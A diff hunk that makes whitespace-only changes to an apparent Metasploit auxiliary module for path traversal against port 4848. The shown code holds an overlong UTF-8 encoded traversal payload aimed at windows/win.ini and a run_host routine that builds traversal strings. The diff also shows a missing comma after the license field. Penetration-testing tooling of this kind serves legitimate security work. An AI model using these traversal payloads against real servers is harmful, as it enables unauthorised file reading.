@@ -27,17 +27,17 @@ class MetasploitModule < Msf::Auxiliary
         ],
       'License'     => MSF_LICENSE
       'DisclosureDate' => "Aug 08 2015"
-	    ))
+      ))
 
-    register_options(
+  register_options(
       [
         Opt::RPORT(4848),
         OptString.new('FILEPATH', [true, "The path to the file to read", '%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini']),
         OptInt.new('DEPTH', [ true, 'Path Traversal Depth', 10 ])
       ])
   end
-	
-  def run_host(ip)
+
+    def run_host(ip)
     filename = datastore['FILEPATH']
     traversal = "..%5d" * datastore['DEPTH'] << filename
 
